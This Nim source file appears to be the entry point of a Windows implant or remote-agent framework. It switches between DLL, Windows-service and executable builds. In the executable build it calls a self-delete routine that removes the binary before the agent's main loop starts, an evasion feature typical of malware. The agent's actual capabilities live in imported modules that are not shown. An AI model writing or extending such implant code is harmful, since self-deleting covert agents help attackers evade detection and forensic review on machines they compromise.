when defined(dll):
  # DLL build - use DLL entry points
  import dll_entry
elif defined(service):
  # Windows Service build - use service entry points
  import service_entry
  
  # Entry point for service - call StartServiceDispatcher
  when isMainModule:
    StartServiceDispatcher()
else:
  # Executable build - use standard main entry point
  import config, agent

  # Conditional imports for Windows-only features
  when defined(windows):
    import utils/self_delete

  # Main entry point
  proc main() =
    # Call the shared agent main loop
    runAgent()

  when isMainModule:
    # Handle self-delete BEFORE main execution if enabled
    when defined(windows):
      let cfg = getConfig()
      if cfg.selfDelete:
        if cfg.debug:
          echo "[DEBUG] Executing self-delete"
        selfDelete()
    
    main()
